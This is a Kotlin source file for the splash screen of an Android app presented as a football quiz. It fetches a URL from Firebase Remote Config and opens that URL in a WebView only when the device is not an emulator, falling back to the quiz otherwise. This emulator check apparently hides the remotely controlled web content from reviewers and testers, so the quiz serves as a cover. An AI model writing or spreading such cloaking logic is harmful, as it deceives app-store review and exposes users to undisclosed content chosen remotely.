package com.template.footballquiz.splachScreen

import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import androidx.fragment.app.Fragment
import com.template.footballquiz.R
import com.template.footballquiz.webView.WebViewFragment
import com.template.footballquiz.fragments.GameFragment
import com.google.firebase.remoteconfig.FirebaseRemoteConfig
import com.google.firebase.remoteconfig.FirebaseRemoteConfigSettings
import com.google.android.gms.tasks.OnCompleteListener
import com.google.android.gms.tasks.Task
import androidx.annotation.NonNull

class SplashFragment : Fragment() {
    private val delayMillis: Long = 2000
    private lateinit var remoteConfig: FirebaseRemoteConfig

    override fun onCreateView(
        inflater: LayoutInflater, container: ViewGroup?, savedInstanceState: Bundle?
    ): View? {
        return inflater.inflate(R.layout.fragment_splash, container, false)
    }

    override fun onViewCreated(view: View, savedInstanceState: Bundle?) {
        super.onViewCreated(view, savedInstanceState)

        // Initialize Firebase Remote Config
        remoteConfig = FirebaseRemoteConfig.getInstance()
        val configSettings = FirebaseRemoteConfigSettings.Builder()
            .setMinimumFetchIntervalInSeconds(3600)
            .build()
        remoteConfig.setConfigSettingsAsync(configSettings)

        remoteConfig.fetchAndActivate().addOnCompleteListener { task ->
            if (task.isSuccessful) {
                val remoteUrl = remoteConfig.getString("url")
                handleNavigation(remoteUrl)
            }
        }
    }

    private fun handleNavigation(url: String) {
        Handler().postDelayed({
            val fragment = if (shouldShowWebView() && url.isNotEmpty()) {
                val webFragment = WebViewFragment()
                val bundle = Bundle()
                bundle.putString(WebViewFragment.KEY_WEB_URL, url)
                webFragment.arguments = bundle
                webFragment
            } else {
                GameFragment()
            }

            parentFragmentManager.beginTransaction()
                .replace(R.id.myNavHostFragment, fragment)
                .commit()
        }, delayMillis)
    }

    private fun shouldShowWebView(): Boolean {
        return !isEmulator()
    }

    private fun isEmulator(): Boolean {
        return Build.FINGERPRINT.contains("generic")
    }
}
